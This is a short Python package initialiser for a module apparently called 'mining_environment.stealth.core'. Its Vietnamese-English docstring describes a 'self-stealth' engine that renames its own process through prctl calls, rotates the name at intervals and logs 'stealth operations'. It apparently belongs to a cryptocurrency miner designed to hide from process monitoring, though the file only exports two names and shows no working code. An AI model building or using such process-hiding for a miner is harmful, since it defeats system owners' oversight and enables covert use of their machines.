"""mining_environment.stealth.core

🔒 **[Stealth Core Engine]** (Động cơ ẩn danh cốt lõi)

Core stealth functionality bao gồm **[Self-Stealth Manager]** (trình quản lý tự ẩn danh)
và các tiện ích logging cho stealth operations.

⚠️ COMPONENTS:
- **self_stealth.py**: Core self-stealth engine với prctl system calls
- **stealth_logger.py**: Specialized logging cho stealth operations

✅ FEATURES:  
- Process tự thay đổi tên từ bên trong
- Name rotation với configurable intervals
- Signal handling & cleanup
- Cross-platform prctl support
"""

from .self_stealth import SelfStealthManager, start_self_stealth

__all__ = ['SelfStealthManager', 'start_self_stealth']